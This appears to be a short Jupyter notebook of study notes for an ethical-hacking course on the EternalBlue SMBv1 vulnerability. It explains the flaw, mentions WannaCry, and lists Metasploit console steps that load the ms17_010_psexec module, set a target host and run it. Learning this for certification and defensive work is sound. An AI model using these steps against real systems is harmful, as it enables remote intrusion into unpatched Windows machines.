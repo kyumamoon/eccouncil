{
 "cells": [
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# **Exploiting Eternal Blue Vulnerability**"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "- Targeting Win 7 and older.\n",
    "- EternalBlue is an exploit that allows attacker to remotely execute arbitrary code and gain access to network by sending specially crafted packets.\n",
    "    - Exploits a vulnerability in MS Windows Server Message BLOCK version 1 (SMBv1) protocol. A network file sharing protocol that allows access to files on a remote server.\n",
    "    - WannaCry crypto-ransomeware used EternalBlue to spread itself across network and spread its payload."
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**MSFCONSOLE EternalBlue Module**"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "- Msfconsole has a module for eternalblue exploit.\n",
    "- msfconsole\n",
    "    - search eternalblue\n",
    "    - exploit/windows/smb/ms17_010_psexec\n",
    "- use exploit/windows/smb/ms17_010_psexec\n",
    "- show options, set any required settings\n",
    "    - RHOST\n",
    "- run"
   ]
  }
 ],
 "metadata": {
  "language_info": {
   "name": "python"
  },
  "orig_nbformat": 4
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
